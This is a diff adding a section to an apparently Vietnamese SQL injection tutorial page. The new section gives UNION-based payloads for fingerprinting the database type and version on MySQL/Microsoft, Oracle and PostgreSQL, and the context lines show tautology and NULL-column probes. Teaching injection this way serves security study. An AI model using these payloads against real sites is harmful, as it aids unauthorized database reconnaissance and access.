@@ -74,3 +74,9 @@ WHERE category = 'Gifts' or 1=1;--' AND released = 1;</pre>
 ' UNION SELECT NULL,NULL FROM DUAL--
 ' UNION SELECT NULL,NULL,NULL FROM DUAL--
 ...</pre>
+
+<h3>2.2. Xác định loại database và version</h3>
+<p>Mỗi loại database có syntax khác nhau, vậy nên sẽ có payload khác nhau:</p>
+<p><strong>Microsoft, MySQL</strong>: <code>' union select @@version</code></p>
+<p><strong>Oracle</strong>: <code>' union select v$version</code></p>
+<p><strong>PostgreSQL</strong>: <code>' union select version()</code></p>
